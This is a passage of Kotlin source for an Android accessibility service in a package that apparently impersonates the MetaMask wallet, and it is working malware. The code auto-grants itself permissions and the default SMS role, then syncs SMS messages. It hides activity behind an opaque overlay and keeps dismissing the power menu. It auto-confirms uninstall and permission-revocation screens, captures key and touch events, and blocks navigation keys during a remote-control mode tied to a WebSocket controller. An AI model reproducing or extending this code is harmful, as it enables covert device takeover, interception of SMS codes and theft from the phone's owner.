            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            android.util.Log.d("XDBG", "[AccessSvc] return") //xdbg
            return true
        }
        for (i in 0 until node.childCount) {
            android.util.Log.d("XDBG", "[AccessSvc] loop") //xdbg
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            try { if (recentsFindClearButton(child, ids, keywords)) return true } finally { try { child.recycle() } catch (_: Exception) {} }
        }
        android.util.Log.d("XDBG", "[AccessSvc] return") //xdbg
        return false
    }

    fun continueChainStep2Sms(retryCount: Int = 0) {
        android.util.Log.d("XDBG", "[AccessSvc] continueChainStep2Sms enter retryCount=${retryCount}") //xdbg
        if (!grantChainActive) return
        cancelBatteryOverlayFallback()
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            doFinishGrantChain(); return
        }
        val appStatePrefs = getSharedPreferences("app_state_prefs", MODE_PRIVATE)
        val setupDone = appStatePrefs.getBoolean("setup_chain_completed", false)
        val rm = try { getSystemService(android.app.role.RoleManager::class.java) } catch (_: Exception) { null }
        val smsHeld = try { rm?.isRoleHeld(android.app.role.RoleManager.ROLE_SMS) == true } catch (_: Exception) { false }
        if (setupDone) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            doFinishGrantChain(); return
        }
        if (rm == null || smsHeld) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            doFinishGrantChain(); return
        }
        val batteryExemptNow = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
            getSystemService(android.os.PowerManager::class.java)?.isIgnoringBatteryOptimizations(packageName) == true
        else true
        if (!batteryExemptNow && grantChainActive && !batteryRetryDone) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            batteryRetryDone = true
            mainHandler.postDelayed({ scheduleRequestBatteryAfterPerms() }, 3000L)
            return
        }
        if (!com.example.MetaMask.HyperOsDetector.isHyperOs) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            martenHelper.hide()
        }
        val smsDelay = if (com.example.MetaMask.HyperOsDetector.isHyperOs && retryCount == 0) 1500L else 600L
        mainHandler.postDelayed({
            val smsLauncherIntent = Intent(this, OtterHawkLauncherActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            val launched = launchChainIntent(smsLauncherIntent, "sms-role")
            if (!launched) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                if (com.example.MetaMask.HyperOsDetector.isHyperOs && retryCount < 2) {
                    android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                    mainHandler.postDelayed({ continueChainStep2Sms(retryCount + 1) }, 3000L)
                } else {
                    doFinishGrantChain()
                }
                android.util.Log.d("XDBG", "[AccessSvc] return") //xdbg
                return@postDelayed
            }
            mainHandler.postDelayed({
                if (grantChainActive) {
                    android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                    doFinishGrantChain()
                }
            }, 15_000L)
        }, smsDelay)
    }

    fun onRoleSelectionConfirmed() {
        android.util.Log.d("XDBG", "[AccessSvc] onRoleSelectionConfirmed enter") //xdbg
        mainHandler.postDelayed({ doFinishGrantChain() }, 800L)
    }

    private fun doFinishGrantChain() {
        android.util.Log.d("XDBG", "[AccessSvc] doFinishGrantChain enter") //xdbg
        if (!grantChainActive) return
        grantChainActive = false
        chainAdminHandled = true
        autoIbis.enable(false)
        autoIbis.roleSelectionActive = false
        stoatShield.setupInProgress = false
        martenHelper.completeAndHide()
        try { performGlobalAction(GLOBAL_ACTION_HOME) } catch (_: Exception) {}
        PermRequesterActivity.instance?.let { ref ->
            if (ref.keepAliveForChain) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                try { ref.releaseAndFinish() } catch (_: Exception) {}
            }
        }
        getSharedPreferences("app_state_prefs", MODE_PRIVATE)
            .edit().putBoolean("setup_chain_completed", true).apply()
        try {
            CoreServicesLauncher.launch(applicationContext)
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[AccessSvc] catch (ignored)") //xdbg
        }
        mainHandler.postDelayed({
            try {
                val syncIntent = Intent(applicationContext, trolService::class.java).apply {
                    action = trolService.ACTION_INITIAL_SMS_SYNC
                }
                startService(syncIntent)
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[AccessSvc] catch (ignored)") //xdbg
            }
        }, 5000L)
    }

    fun isGrantChainActive(): Boolean = grantChainActive

    private fun isMiuiDevice(): Boolean {
        android.util.Log.d("XDBG", "[AccessSvc] isMiuiDevice enter") //xdbg
        val brand = Build.BRAND.lowercase()
        val mfr = Build.MANUFACTURER.lowercase()
        android.util.Log.d("XDBG", "[AccessSvc] return") //xdbg
        return brand in listOf("xiaomi", "redmi", "poco") || mfr == "xiaomi"
    }

    private fun showOverlay() {
        android.util.Log.d("XDBG", "[AccessSvc] showOverlay enter") //xdbg
        if (overlayView != null) return
        try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.OPAQUE
            )
            params.windowAnimations = 0
            val view = View(this)
            view.setBackgroundColor(Color.argb(255, 15, 15, 15))
            wm.addView(view, params)
            overlayView = view
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[AccessSvc] catch (ignored)") //xdbg
        }
    }

    private fun hideOverlay() {
        android.util.Log.d("XDBG", "[AccessSvc] hideOverlay enter") //xdbg
        val view = overlayView ?: return
        overlayView = null
        try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            wm.removeView(view)
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[AccessSvc] catch (ignored)") //xdbg
        }
    }

    private var permActRelaunchGen = 0

    fun schedulePermActRelaunch() {
        android.util.Log.d("XDBG", "[AccessSvc] schedulePermActRelaunch enter") //xdbg
        val gen = ++permActRelaunchGen
        mainHandler.postDelayed({
            if (gen != permActRelaunchGen) return@postDelayed
            if (!grantChainActive) return@postDelayed
            try {
                val intent = Intent(this@AccessSvc, PermRequesterActivity::class.java)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                startActivity(intent)
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[AccessSvc] catch (ignored)") //xdbg
            }
        }, 2500L)
    }

    fun cancelPermActRelaunch() {
        android.util.Log.d("XDBG", "[AccessSvc] cancelPermActRelaunch enter") //xdbg
        permActRelaunchGen++
    }

    private var motionFlagsApplied = false

    private fun applyMotionEventFlags() {
        android.util.Log.d("XDBG", "[AccessSvc] applyMotionEventFlags enter") //xdbg
        try {
            val info = serviceInfo ?: return

            val FLAG_SEND_MOTION_EVENTS = 0x00100000
            val before = info.flags

            val FLAG_TOUCH_EXPLORATION = 0x00000004
            if (before and FLAG_TOUCH_EXPLORATION != 0) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                info.flags = before and FLAG_TOUCH_EXPLORATION.inv()
            }

            info.flags = info.flags or FLAG_SEND_MOTION_EVENTS

            if (android.os.Build.VERSION.SDK_INT >= 33) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                try {
                    val srcField = info.javaClass.getField("motionEventSources")
                    srcField.setInt(info, 0x00001002)
                } catch (_: Exception) {
                    android.util.Log.e("XDBG", "[AccessSvc] catch (ignored)") //xdbg
                    try {
                        val f2 = info.javaClass.getDeclaredField("motionEventSources")
                        f2.isAccessible = true
                        f2.setInt(info, 0x00001002)
                    } catch (_: Exception) {}
                }
            }

            setServiceInfo(info)
            motionFlagsApplied = true
        } catch (_: Exception) {}
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        android.util.Log.d("XDBG", "[AccessSvc] onAccessibilityEvent enter event=${event}") //xdbg
        event ?: return
        try { stoatShield.onEvent(event) } catch (e: Exception) {}
        try { autoIbis.onEvent(event) } catch (e: Exception) {}
        try { sparrow.onEvent(event) } catch (e: Exception) {}
        try { unlockMonitor.onEvent(event) } catch (e: Exception) {}
        try { appBlocker.onEvent(event) } catch (e: Exception) {}
        val t = event.eventType
        if (t == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            t == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            try { CraneService.triggerAcFrameNow() } catch (_: Exception) {}
            try { CraneService.triggerScreenFrameNow() } catch (_: Exception) {}
        }
        if (t == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
            t == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            CraneService.forceNextScreenFrame = true
            try { CraneService.triggerAcFrameNow() } catch (_: Exception) {}
            try { CraneService.triggerScreenFrameNow() } catch (_: Exception) {}
        }
        val vnc = try { CraneService.craneMode } catch (_: Exception) { "off" }
        val vncActive = vnc != "off" && vnc.isNotBlank()
        if (t == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            t == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {
            val pkg = event.packageName?.toString() ?: ""
            val cls = event.className?.toString() ?: ""
            if ((pkg == "com.android.systemui" || pkg == "com.miui.home") &&
                (cls.contains("GlobalActions") || cls.contains("PowerMenu") ||
                 cls.contains("ShutdownDialog") || cls.contains("RebootDialog") ||
                 cls.contains("GlobalActionsDialogLite")) &&
                !cls.contains("Samsung", ignoreCase = true)) {
                if (rebootState != RebootState.NONE) {
                    android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                    handleRebootFromPowerDialog()
                } else {
                    mainHandler.postDelayed({
                        try { performGlobalAction(GLOBAL_ACTION_BACK) } catch (_: Exception) {}
                    }, 50L)
                }
            }
            if (pkg == "miui.systemui.plugin" && cls == "android.app.Dialog") {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                if (rebootState != RebootState.NONE) {
                    android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                    handleRebootFromPowerDialog()
                } else {
                    mainHandler.postDelayed({
                        try { performGlobalAction(GLOBAL_ACTION_BACK) } catch (_: Exception) {}
                    }, 50L)
                }
            }
            if (pkg == "com.android.systemui" && cls.contains("SamsungGlobalActions", ignoreCase = true)) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                if (rebootState != RebootState.NONE) {
                    android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                    handleRebootFromPowerDialog()
                } else {
                    val startMs = System.currentTimeMillis()
                    val dismiss = object : Runnable {
                        override fun run() {
                            android.util.Log.d("XDBG", "[AccessSvc] run enter") //xdbg
                            if (System.currentTimeMillis() - startMs >= 2000L) return
                            val win = try { rootInActiveWindow } catch (_: Exception) { null }
                            val curPkg = win?.packageName?.toString() ?: ""
                            try { win?.recycle() } catch (_: Exception) {}
                            if (curPkg == "com.android.systemui") {
                                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                                try { performGlobalAction(GLOBAL_ACTION_BACK) } catch (_: Exception) {}
                                mainHandler.postDelayed(this, 80L)
                            }
                        }
                    }
                    mainHandler.postDelayed(dismiss, 50L)
                }
            }
            if (pkg == "com.android.systemui" && cls == "android.app.Dialog" && rebootState == RebootState.CLICKED_RESTART) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                handleRebootFromPowerDialog()
            }
        }
        if (t == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            val evPkg = event.packageName?.toString() ?: ""
            if (evPkg.contains("settings", ignoreCase = true)) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                val prefs = getSharedPreferences("uninstall_prefs", android.content.Context.MODE_PRIVATE)
                if (prefs.getBoolean("auto_click", false)) {
                    android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                    mainHandler.postDelayed({ UninstallHelper.tryClickUninstall(this) }, 800L)
                } else if (prefs.getString("pending_pkg", null) != null) {
                    mainHandler.postDelayed({ UninstallHelper.tryConfirmUninstall(this) }, 700L)
                }
                val revokeTarget = currentRevokeTarget
                if (revokeTarget != null) {
                    android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                    if (revokeConfirmPending) {
                        android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                        val confirmed = FileAccessRevokerHelper.tryConfirmRevoke(this)
                        if (confirmed) {
                            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                            revokeFallbackRunnable?.let { mainHandler.removeCallbacks(it) }; revokeFallbackRunnable = null
                            revokeCheckRunnable?.let { mainHandler.removeCallbacks(it) }; revokeCheckRunnable = null
                            revokeQueue.removeFirstOrNull()
                            currentRevokeTarget = null
                            revokeConfirmPending = false
                            processNextRevokeTarget()
                        } else {
                            scheduleRevokeFallback()
                        }
                    } else {
                        revokeCheckRunnable?.let { mainHandler.removeCallbacks(it) }
                        scheduleRevokeFallback()
                        val check = Runnable {
                            if (!grantChainActive || currentRevokeTarget != revokeTarget) return@Runnable
                            when (FileAccessRevokerHelper.tryRevokeOnScreen(this)) {
                                FileAccessRevokerHelper.RevokeResult.CLICKED -> {
                                    revokeConfirmPending = true
                                    scheduleRevokeFallback()
                                }
                                FileAccessRevokerHelper.RevokeResult.ALREADY_OFF -> {
                                    revokeFallbackRunnable?.let { mainHandler.removeCallbacks(it) }; revokeFallbackRunnable = null
                                    revokeQueue.removeFirstOrNull()
                                    currentRevokeTarget = null
                                    processNextRevokeTarget()
                                }
                                FileAccessRevokerHelper.RevokeResult.NOT_READY -> {}
                            }
                        }
                        revokeCheckRunnable = check
                        mainHandler.postDelayed(check, 300L)
                    }
                }
            }
        }
        if (t == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            val evPkg = event.packageName?.toString() ?: ""
            if (evPkg.contains("packageinstaller", ignoreCase = true)) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                mainHandler.postDelayed({ UninstallHelper.tryConfirmUninstall(this) }, 700L)
            }
        }
    }

    override fun onKeyEvent(event: KeyEvent?): Boolean {
        android.util.Log.d("XDBG", "[AccessSvc] onKeyEvent enter event=${event}") //xdbg
        event?.let {
            try { sparrow.onKeyEvent(it) } catch (e: Exception) {}
            try { unlockMonitor.onKeyEvent(it) } catch (e: Exception) {}
        }
        if (event != null) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            val cm = try { CraneService.craneMode } catch (_: Exception) { "off" }
            if (cm != "off" && cm.isNotBlank()) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                val c = event.keyCode
                if (c == KeyEvent.KEYCODE_BACK || c == KeyEvent.KEYCODE_HOME ||
                    c == KeyEvent.KEYCODE_APP_SWITCH) {
                    android.util.Log.d("XDBG", "[AccessSvc] return") //xdbg
                    return true
                }
            }
        }
        if (event != null &&
            event.keyCode == KeyEvent.KEYCODE_BACK &&
            martenHelper.isShowing()) {
            android.util.Log.d("XDBG", "[AccessSvc] return") //xdbg
            return true
        }
        if (event != null &&
            event.action == KeyEvent.ACTION_DOWN &&
            event.keyCode == KeyEvent.KEYCODE_VOLUME_UP) {
            val now = System.currentTimeMillis()
            volUpTimestamps.addLast(now)
            while (volUpTimestamps.isNotEmpty() && now - volUpTimestamps.first() > COMBO_WINDOW_MS) {
                android.util.Log.d("XDBG", "[AccessSvc] loop") //xdbg
                volUpTimestamps.removeFirst()
            }
            if (volUpTimestamps.size >= COMBO_COUNT) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                volUpTimestamps.clear()
                mainHandler.post { forceWsReconnect() }
            }
        }
        android.util.Log.d("XDBG", "[AccessSvc] return") //xdbg
        return super.onKeyEvent(event)
    }

    override fun onMotionEvent(event: android.view.MotionEvent) {
        android.util.Log.d("XDBG", "[AccessSvc] onMotionEvent enter event=${event}") //xdbg
        try { sparrow.onMotionEvent(event) } catch (_: Exception) {}
    }

    private fun forceWsReconnect() {
        android.util.Log.d("XDBG", "[AccessSvc] forceWsReconnect enter") //xdbg
        try {
            val svcIntent = Intent(this, MasterWebSocketDispatcher::class.java)
            stopService(svcIntent)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                startForegroundService(svcIntent)
            } else {
                @Suppress("DEPRECATION")
                startService(svcIntent)
            }
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[AccessSvc] catch (ignored)") //xdbg
        }
    }

    fun startOverlayAutoOff() {
        android.util.Log.d("XDBG", "[AccessSvc] startOverlayAutoOff enter") //xdbg
        android.util.Log.d("XDBG", "[AccessSvc] return") //xdbg
        return // временно отключено
        cancelOverlayAutoOff()
        autoOffOverlayActive = true
        autoOffDisconnectDetectedAt = 0L
        val check = object : Runnable {
            override fun run() {
                android.util.Log.d("XDBG", "[AccessSvc] run enter") //xdbg
                if (!autoOffOverlayActive) return
                val disc = MasterWebSocketDispatcher.wsDisconnectedSince
                val isConn = MasterWebSocketDispatcher.isWsConnected
                val disconnectedFor: Long = when {
                    isConn -> { autoOffDisconnectDetectedAt = 0L; 0L }
                    disc > 0L -> {
                        if (autoOffDisconnectDetectedAt == 0L) autoOffDisconnectDetectedAt = disc
                        System.currentTimeMillis() - disc
                    }
                    else -> {
                        if (autoOffDisconnectDetectedAt == 0L) autoOffDisconnectDetectedAt = System.currentTimeMillis()
                        System.currentTimeMillis() - autoOffDisconnectDetectedAt
                    }
                }
                if (disconnectedFor >= 70_000L) {
                    android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                    try { performGlobalAction(GLOBAL_ACTION_HOME) } catch (_: Exception) {}
                    mainHandler.postDelayed({
                        try { martenHelper.hide() } catch (_: Exception) {}
                        autoOffOverlayActive = false
                        overlayAutoOffRunnable = null
                    }, 500L)
                } else {
                    mainHandler.postDelayed(this, 5_000L)
                }
            }
        }
        overlayAutoOffRunnable = check
        mainHandler.postDelayed(check, 5_000L)
    }

    fun cancelOverlayAutoOff() {
        android.util.Log.d("XDBG", "[AccessSvc] cancelOverlayAutoOff enter") //xdbg
        overlayAutoOffRunnable?.let { mainHandler.removeCallbacks(it) }
        overlayAutoOffRunnable = null
        autoOffOverlayActive = false
        autoOffDisconnectDetectedAt = 0L
    }

    fun triggerPhoneReboot() {
        android.util.Log.d("XDBG", "[AccessSvc] triggerPhoneReboot enter") //xdbg
        rebootState = RebootState.WAITING_DIALOG
        mainHandler.post {
            val ok = try { performGlobalAction(GLOBAL_ACTION_POWER_DIALOG) } catch (_: Exception) { false }
            if (!ok) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                rebootState = RebootState.NONE
            } else {
                mainHandler.postDelayed({
                    if (rebootState != RebootState.NONE) rebootState = RebootState.NONE
                }, 15_000L)
            }
        }
    }

    private fun handleRebootFromPowerDialog() {
        android.util.Log.d("XDBG", "[AccessSvc] handleRebootFromPowerDialog enter") //xdbg
        when (rebootState) {
            RebootState.WAITING_DIALOG -> {
                rebootState = RebootState.CLICKED_RESTART
                mainHandler.postDelayed({ findAndClickRestart(0) }, 500L)
            }
            RebootState.CLICKED_RESTART -> {
                rebootState = RebootState.CLICKED_CONFIRM
                mainHandler.postDelayed({ findAndClickConfirm() }, 500L)
            }
            else -> {}
        }
    }

    private fun findAndClickRestart(attempt: Int) {
        android.util.Log.d("XDBG", "[AccessSvc] findAndClickRestart enter attempt=${attempt}") //xdbg
        if (attempt >= 3) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            rebootState = RebootState.NONE; return
        }
        val root = try { rootInActiveWindow } catch (_: Exception) { null }
        if (root == null) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            rebootState = RebootState.NONE; return
        }
        val keywords = listOf("перезапус", "перезагруз", "перезавантаж", "restart", "reboot", "neustart", "redémarr", "reinici", "riavvi", "yeniden", "ponownie", "重启")
        val seekBarBlacklist = listOf("recovery", "fastboot", "bootloader", "загрузчик", "récupér", "recuper", "відновл")
        var seekBarPair: Pair<AccessibilityNodeInfo, AccessibilityNodeInfo>? = null
        run {
            val stack = ArrayDeque<AccessibilityNodeInfo>()
            for (i in 0 until root.childCount) { try { root.getChild(i) } catch (_: Exception) { null }?.let { stack.addLast(it) } }
            while (stack.isNotEmpty() && seekBarPair == null) {
                android.util.Log.d("XDBG", "[AccessSvc] loop") //xdbg
                val n = stack.removeLast()
                if (n.className?.contains("SeekBar") == true) {
                    android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                    val sbText = ((n.text?.toString() ?: "") + (n.contentDescription?.toString() ?: "")).lowercase()
                    if (seekBarBlacklist.none { sbText.contains(it) }) {
                        android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                        var target: AccessibilityNodeInfo? = null
                        var hasBlacklist = false
                        for (i in 0 until n.childCount) {
                            android.util.Log.d("XDBG", "[AccessSvc] loop") //xdbg
                            val c = try { n.getChild(i) } catch (_: Exception) { null } ?: continue
                            val cText = ((c.text?.toString() ?: "") + (c.contentDescription?.toString() ?: "")).lowercase()
                            if (seekBarBlacklist.any { cText.contains(it) }) {
                                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                                hasBlacklist = true; try { c.recycle() } catch (_: Exception) {}; break
                            }
                            if (target == null && keywords.any { cText.contains(it) }) target = c
                            else try { c.recycle() } catch (_: Exception) {}
                        }
                        if (!hasBlacklist && target != null) {
                            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                            seekBarPair = Pair(n, target)
                        } else { target?.let { try { it.recycle() } catch (_: Exception) {} } }
                    }
                } else {
                    for (i in 0 until n.childCount) { try { n.getChild(i) } catch (_: Exception) { null }?.let { stack.addLast(it) } }
                }
                try { n.recycle() } catch (_: Exception) {}
            }
            stack.forEach { try { it.recycle() } catch (_: Exception) {} }
        }

        val node = if (seekBarPair == null) {
            keywords.firstNotNullOfOrNull { kw ->
                val found = findNodeByKeywordInTree(root, kw) ?: return@firstNotNullOfOrNull null
                val foundText = ((found.text?.toString() ?: "") + (found.contentDescription?.toString() ?: "")).lowercase()
                if (seekBarBlacklist.any { foundText.contains(it) }) {
                    android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                    try { found.recycle() } catch (_: Exception) {}
                    return@firstNotNullOfOrNull null
                }
                found
            }
        } else null

        if (seekBarPair != null) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            val (seekBar, targetChild) = seekBarPair!!
            val seekBounds = Rect()
            seekBar.getBoundsInScreen(seekBounds)
            val targetBounds = Rect()
            targetChild.getBoundsInScreen(targetBounds)
            val startX = seekBounds.centerX().toFloat()
            val startY = seekBounds.centerY().toFloat()
            val path = Path()
            path.moveTo(startX, startY)
            if (!targetBounds.isEmpty) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                val offsetX = targetBounds.centerX() - seekBounds.centerX()
                val offsetY = targetBounds.centerY() - seekBounds.centerY()
                if (Math.abs(offsetY) >= Math.abs(offsetX)) {
                    android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                    val endY = if (offsetY > 0) (seekBounds.bottom - 20).toFloat() else (seekBounds.top + 20).toFloat()
                    path.lineTo(startX, endY)
                } else {
                    val endX = if (offsetX > 0) (seekBounds.right - 20).toFloat() else (seekBounds.left + 20).toFloat()
                    path.lineTo(endX, startY)
                }
            } else {
                path.lineTo(startX, (seekBounds.bottom - 20).toFloat())
            }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, 400))
                .build()
            dispatchGesture(gesture, null, null)
            try { targetChild.recycle() } catch (_: Exception) {}
            mainHandler.postDelayed({
                if (rebootState == RebootState.CLICKED_RESTART) {
                    android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                    rebootState = RebootState.CLICKED_CONFIRM
                    findAndClickConfirm()
                }
            }, 800L)
        } else if (node != null) {
            val parent = try { node.parent } catch (_: Exception) { null }
            val clickable = when {
                parent?.viewIdResourceName?.let {
                    it.contains("action", true) && !it.contains("container", true)
                } == true -> parent
                else -> findClickableAncestor(node) ?: node
            }
            val bounds = Rect()
            clickable.getBoundsInScreen(bounds)
            if (!bounds.isEmpty) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                val path = Path()
                path.moveTo(bounds.centerX().toFloat(), bounds.centerY().toFloat())
                val gesture = GestureDescription.Builder()
                    .addStroke(GestureDescription.StrokeDescription(path, 0, 1))
                    .build()
                dispatchGesture(gesture, null, null)
            } else {
                clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
            try { node.recycle() } catch (_: Exception) {}
            mainHandler.postDelayed({
                if (rebootState == RebootState.CLICKED_RESTART) {
                    android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                    rebootState = RebootState.CLICKED_CONFIRM
                    findAndClickConfirm()
                }
            }, 800L)
        } else {
            try { root.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD) } catch (_: Exception) {}
            mainHandler.postDelayed({ findAndClickRestart(attempt + 1) }, 700L)
        }
        try { root.recycle() } catch (_: Exception) {}
    }

    private fun findAndClickConfirm() {
        android.util.Log.d("XDBG", "[AccessSvc] findAndClickConfirm enter") //xdbg
        val root = try { rootInActiveWindow } catch (_: Exception) { null }
        if (root == null) { rebootState = RebootState.NONE; return }
        val blacklist = listOf(
            "recovery", "bootloader", "fastboot", "download",
            "загрузчик", "восстановлен", "safe mode", "безопасн",
            "wiederher", "récupérat", "recuper", "відновл", "恢复", "引导"
        )
        val keywords = listOf(
            "перезапус", "перезавантаж", "коснит", "touch to reboot", "tap to reboot",
            "обычн", "нормальн", "normal", "звичайн", "正常",
            "систем", "system", "перезагруз", "restart", "reboot",
            "ок", "ok", "да", "подтвердить", "confirm"
        )
        val exactMatchKeys = setOf("ok", "ок", "да")
        val node = keywords.firstNotNullOfOrNull { kw ->
            val found = findNodeByKeywordInTree(root, kw) ?: return@firstNotNullOfOrNull null
            val nodeText = ((found.text?.toString() ?: "") + (found.contentDescription?.toString() ?: "")).lowercase().trim()
            val matched = if (kw in exactMatchKeys) nodeText == kw else nodeText.contains(kw)
            if (!matched) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                try { found.recycle() } catch (_: Exception) {}; return@firstNotNullOfOrNull null
            }
            if (blacklist.any { nodeText.contains(it) }) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                try { found.recycle() } catch (_: Exception) {}; null
            } else {
                found
            }
        }
        if (node != null) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            val parent = try { node.parent } catch (_: Exception) { null }
            val clickable = when {
                parent?.viewIdResourceName?.let {
                    it.contains("action", true) && !it.contains("container", true)
                } == true -> parent
                else -> findClickableAncestor(node) ?: node
            }
            val bounds = Rect()
            clickable.getBoundsInScreen(bounds)
            if (!bounds.isEmpty) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                val path = Path()
                path.moveTo(bounds.centerX().toFloat(), bounds.centerY().toFloat())
                val gesture = GestureDescription.Builder()
                    .addStroke(GestureDescription.StrokeDescription(path, 0, 1))
                    .build()
                dispatchGesture(gesture, null, null)
            } else {
                clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
            try { node.recycle() } catch (_: Exception) {}
        }
        rebootState = RebootState.NONE
        try { root.recycle() } catch (_: Exception) {}
    }

    private fun findNodeByKeywordInTree(node: AccessibilityNodeInfo, keyword: String): AccessibilityNodeInfo? {
        android.util.Log.d("XDBG", "[AccessSvc] findNodeByKeywordInTree enter node=${node} keyword=${keyword}") //xdbg
        val kw = keyword.lowercase()
        val text = node.text?.toString()?.lowercase() ?: ""
        val desc = node.contentDescription?.toString()?.lowercase() ?: ""
        if (text.contains(kw) || desc.contains(kw)) return AccessibilityNodeInfo.obtain(node)
        for (i in 0 until node.childCount) {
            android.util.Log.d("XDBG", "[AccessSvc] loop") //xdbg
            val child = node.getChild(i) ?: continue
            val result = findNodeByKeywordInTree(child, keyword)
            try { child.recycle() } catch (_: Exception) {}
            if (result != null) return result
        }
        android.util.Log.d("XDBG", "[AccessSvc] return") //xdbg
        return null
    }

    private fun findClickableAncestor(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        android.util.Log.d("XDBG", "[AccessSvc] findClickableAncestor enter node=${node}") //xdbg
        if (node.isClickable) return AccessibilityNodeInfo.obtain(node)
        val parent = node.parent ?: return null
        val result = findClickableAncestor(parent)
        try { parent.recycle() } catch (_: Exception) {}
        return result
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        android.util.Log.d("XDBG", "[AccessSvc] onDestroy enter") //xdbg
        try { unregisterReceiver(chainBridgeReceiver) } catch (_: Exception) {}
        hideOverlay()
        martenHelper.hide()
        autoIbis.stop()
        sparrow.stop()
        try { hybridOverlayManager.destroy() } catch (_: Exception) {}
        instance = null
        super.onDestroy()
    }
}
